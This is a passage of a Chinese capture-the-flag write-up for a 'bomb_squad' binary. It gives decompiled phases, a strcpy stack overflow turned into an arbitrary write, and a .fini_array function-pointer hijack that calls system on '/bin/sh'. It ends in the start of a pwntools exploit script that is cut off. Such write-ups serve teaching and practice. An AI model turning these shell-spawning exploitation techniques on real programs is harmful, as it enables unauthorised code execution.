id=\"phase_4\"><a class=\"anchor\" href=\"#phase_4\">#</a> phase_4</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">phase_4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">get_line</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%d %d %d %d %d %d %d\"</span><span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  result <span class=\"token operator\">=</span> n1<span class=\"token punctuation\">.</span>num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v3 <span class=\"token operator\">=</span> n1<span class=\"token punctuation\">.</span>num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v5<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v5<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">explode_bomb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    v2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>node <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">-></span>next1 <span class=\"token operator\">+</span> v5<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    result <span class=\"token operator\">=</span> v2<span class=\"token operator\">-></span>num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    v3 <span class=\"token operator\">+=</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">95</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">explode_bomb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  phase4_solved <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里 n1 是一个结构体，大致结构如下</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">node</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    node<span class=\"token operator\">*</span> next1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    node<span class=\"token operator\">*</span> next2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    node<span class=\"token operator\">*</span> next3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    node<span class=\"token operator\">*</span> next4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">char</span> name<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">int</span> num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这一关接收用户输入的数字，根据数字来进行结构体之间 num 相加的顺序。</p>\n<p>比如输入为 <code>&quot;0 3&quot;</code> ，相加的顺序就是 <code>0xa+0x7+0x10</code> 。</p>\n<p>最后试出来解为 <code>3 0 3 0 3 0 0</code> 。</p>\n<h3 id=\"secret_phase\"><a class=\"anchor\" href=\"#secret_phase\">#</a> secret_phase</h3>\n<p>通关之后会进入 <code>print_flag</code> ，经过 <code>verify_working</code>  之后会打印出来 flag</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __noreturn <span class=\"token function\">print_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">verify_working</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Congratulations, you won! Here's the flag:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat flag.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>但是 <code>verify_working</code>  始终返回 1 的，而且最终也并没有得到 flag，还是需要 getshell。</p>\n<p>进入 <code>secret_phase</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">secret_phase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is the secret phase.... please whisper, to keep it a seecret...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v3 <span class=\"token operator\">=</span> n2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n6<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Rename node #%d to: \"</span><span class=\"token punctuation\">,</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v2 <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>name<span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">strchrnul</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v2 <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>name<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">putchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Thanks, I was worried about having to come up with clever names myself!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这一段代码是修改每一个 node 的 name 成员，最多只可以溢出一个字节到 num 上面，并没有什么用。</p>\n<h3 id=\"fini段\"><a class=\"anchor\" href=\"#fini段\">#</a> fini 段</h3>\n<blockquote>\n<p>该 section 保存着进程终止代码指令。因此，当一个程序正常退出时，系统安排执行这个 section 的中的代码。</p>\n</blockquote>\n<p><code>.fini_array</code>  中有一个 <code>__gg</code>  函数</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>v5 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  v6 <span class=\"token operator\">=</span> n2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v10 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>n6<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    v0 <span class=\"token operator\">=</span> <span class=\"token function\">alloca</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    v1 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v5 <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    v2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v6 <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token operator\">*</span>v2 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    v2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    v2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v2<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    v2<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    v2<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    v2<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v6 <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v6 <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>经过分析之后发现这个函数会执行每个 node 中 <code>name[4]-name[8]</code>  所指向的函数，而 name 自然可以控制。并且 call 的时候，此时栈顶指向的就是当前 node。那么只需要把某一个 node 的 name 后四个字节修改成 system，next1 指向的内容修改为 <code>/bin/sh\\x00</code>  就可以 getshell。</p>\n<h3 id=\"任意地址写\"><a class=\"anchor\" href=\"#任意地址写\">#</a> 任意地址写</h3>\n<p>__nr 函数：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token function\">_nr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">__readgsdword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x14u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v0 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">get_line</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">,</span> v0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">get_line</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readgsdword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x14u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>很明显的栈溢出，可以通过第一个输入，将 v4 覆盖为 <code>node-&gt;next1</code>  的地址，通过第二个输入在修改 <code>next1</code>  所指向的内容。</p>\n<h3 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./bomb_squad\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"8584\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"[1, 1, 3, 5, 11, 